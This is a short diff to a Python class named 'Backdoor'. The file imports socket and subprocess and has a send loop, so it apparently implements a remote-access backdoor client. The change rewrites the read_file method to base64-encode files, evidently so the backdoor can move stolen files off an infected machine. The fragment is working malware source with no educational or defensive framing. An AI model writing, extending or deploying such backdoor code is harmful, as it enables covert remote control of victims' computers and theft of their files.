@@ -1,6 +1,7 @@
 import socket, json
 import subprocess
 import os
+import base64
 
 
 class Backdoor:
@@ -35,11 +36,9 @@ class Backdoor:
             return f"[-] No such file or directory: '{path}'"
         
     def read_file(self, path):
-        try:
-            with open(path, "rb") as file:
-                return bytes(file.read(), "utf-8")
-        except:
-            self.reliable_send(f"[-] No such file or directory: '{path}'")
+        file = open(path, "rb").read()
+        file = base64.encodebytes(file).decode('utf-8')
+        return file
 
     def run(self):
         while True:
